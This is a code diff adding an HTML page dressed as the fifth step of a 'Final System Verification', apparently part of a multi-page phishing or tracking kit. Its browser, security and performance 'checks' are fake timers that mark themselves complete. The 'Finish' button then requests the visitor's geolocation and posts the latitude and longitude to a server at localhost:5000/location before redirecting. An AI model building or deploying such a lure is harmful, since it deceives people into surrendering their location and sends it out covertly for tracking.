@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Final System Verification</title>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 800px;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.1);
+      overflow: hidden;
+    }
+
+    header {
+      padding: 25px;
+      background: linear-gradient(to right, #4361ee, #3f37c9);
+      color: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .logo i {
+      font-size: 28px;
+    }
+
+    .progress {
+      background: #f1f1f1;
+      height: 8px;
+    }
+
+    .progress-fill {
+      width: 80%;
+      height: 100%;
+      background: linear-gradient(to right, #4361ee, #4cc9f0);
+      transition: width 0.6s ease;
+    }
+
+    .content {
+      padding: 40px;
+      text-align: center;
+    }
+
+    .icon {
+      width: 110px;
+      height: 110px;
+      background: linear-gradient(135deg, #4895ef, #4361ee);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: auto;
+      font-size: 45px;
+      color: #fff;
+    }
+
+    .icon.complete {
+      background: linear-gradient(135deg, #38b000, #4cc9f0);
+    }
+
+    h2 {
+      margin: 25px 0 10px;
+    }
+
+    p {
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    .dots {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 30px 0;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      background: #4361ee;
+      border-radius: 50%;
+      animation: bounce 1.4s infinite;
+    }
+
+    .dot:nth-child(2){ animation-delay: .2s }
+    .dot:nth-child(3){ animation-delay: .4s }
+
+    @keyframes bounce {
+      0%,80%,100% { transform: translateY(0); }
+      40% { transform: translateY(-15px); }
+    }
+
+    .status {
+      text-align: left;
+      margin: 30px 0;
+    }
+
+    .item {
+      display: flex;
+      justify-content: space-between;
+      padding: 15px;
+      border: 1px solid #eee;
+      border-radius: 12px;
+      margin-bottom: 10px;
+    }
+
+    .complete {
+      color: green;
+      font-weight: 600;
+    }
+
+    button {
+      padding: 16px 40px;
+      font-size: 18px;
+      border: none;
+      border-radius: 40px;
+      background: linear-gradient(to right, #4361ee, #3f37c9);
+      color: #fff;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .msg {
+      display: none;
+      margin-top: 20px;
+      color: green;
+      font-weight: 600;
+    }
+
+    .msg.show {
+      display: block;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+  <header>
+    <div class="logo">
+      <i class="fas fa-check-circle"></i>
+      <h3>Final Verification</h3>
+    </div>
+    <span>Step 5 / 5</span>
+  </header>
+
+  <div class="progress">
+    <div class="progress-fill" id="bar"></div>
+  </div>
+
+  <div class="content">
+    <div class="icon" id="mainIcon">
+      <i class="fas fa-cogs"></i>
+    </div>
+
+    <h2>System Check in Progress</h2>
+    <p>We are verifying system compatibility and permissions.</p>
+
+    <div class="dots" id="dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <div class="status">
+      <div class="item"><span>Browser</span><span id="b">Checking...</span></div>
+      <div class="item"><span>Security</span><span id="s">Checking...</span></div>
+      <div class="item"><span>Performance</span><span id="p">Checking...</span></div>
+    </div>
+
+    <button id="btn">Complete Verification</button>
+
+    <div class="msg" id="msg">✔ All checks complete</div>
+  </div>
+</div>
+
+<script>
+const btn = document.getElementById("btn");
+
+btn.onclick = () => {
+  btn.disabled = true;
+  btn.innerHTML = "Verifying...";
+  document.getElementById("bar").style.width = "100%";
+
+  setTimeout(() => done("b"), 800);
+  setTimeout(() => done("s"), 1600);
+  setTimeout(() => done("p"), 2400);
+
+  setTimeout(finalStep, 3200);
+};
+
+function done(id){
+  const el = document.getElementById(id);
+  el.innerText = "Complete";
+  el.className = "complete";
+}
+
+function finalStep(){
+  document.getElementById("dots").style.display = "none";
+  document.getElementById("msg").classList.add("show");
+  document.getElementById("mainIcon").classList.add("complete");
+  document.getElementById("mainIcon").innerHTML = '<i class="fas fa-check"></i>';
+
+  btn.disabled = false;
+  btn.innerHTML = "Finish";
+
+  btn.onclick = getLocation;
+}
+
+function getLocation(){
+  if(!navigator.geolocation) return;
+
+  btn.disabled = true;
+  btn.innerHTML = "Finishing...";
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      try {
+        await fetch("http://localhost:5000/location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          })
+        });
+
+        localStorage.setItem("verified","true");
+        window.location.href = "page4.html";
+
+      } catch(err){
+        console.error(err);
+        btn.disabled = false;
+        btn.innerHTML = "Retry";
+      }
+    },
+    () => {
+      btn.disabled = false;
+      btn.innerHTML = "Permission Required";
+    }
+  );
+}
+</script>
+
+</body>
+</html>
